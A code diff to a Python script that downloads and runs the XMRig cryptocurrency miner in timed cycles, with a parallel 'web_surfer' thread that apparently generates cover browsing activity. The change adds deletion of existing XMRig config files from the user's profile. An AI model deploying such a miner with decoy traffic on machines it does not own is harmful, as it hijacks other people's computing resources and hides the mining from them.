@@ -68,6 +68,17 @@ def main():
     exe_path = download_xmrig()
     working_dir = os.path.dirname(exe_path)
 
+    # Delete any existing config files that might override command line
+    config_paths = [
+        os.path.join(working_dir, "config.json"),
+        os.path.join(os.environ['USERPROFILE'], ".xmrig.json"),
+        os.path.join(os.environ['USERPROFILE'], ".config", "xmrig.json")
+    ]
+    for path in config_paths:
+        if os.path.exists(path):
+            os.remove(path)
+            print(f"[+] Removed {path}")
+
     stop_event = threading.Event()
     web_thread = threading.Thread(target=web_surfer, args=(stop_event,), daemon=True)
     web_thread.start()
@@ -108,7 +119,6 @@ def main():
         )
         print(f"[+] Miner started (PID {miner_proc.pid})")
 
-        # Monitor output
         work_start = time.time()
         while time.time() - work_start < work_sec:
             line = miner_proc.stdout.readline()
@@ -120,7 +130,6 @@ def main():
                     break
                 time.sleep(0.5)
 
-        # Stop miner
         if miner_proc.poll() is None:
             miner_proc.terminate()
             miner_proc.wait(timeout=10)
@@ -128,12 +137,12 @@ def main():
         else:
             print("[+] Miner already stopped.")
 
-        # Break
-        print(f"[+] Breaking for {break_sec//60} minutes...")
-        for _ in range(break_sec):
-            if time.time() >= total_end or stop_event.is_set():
-                break
-            time.sleep(1)
+        if break_sec > 0:
+            print(f"[+] Breaking for {break_sec//60} minutes...")
+            for _ in range(break_sec):
+                if time.time() >= total_end or stop_event.is_set():
+                    break
+                time.sleep(1)
 
     stop_event.set()
     web_thread.join(timeout=10)
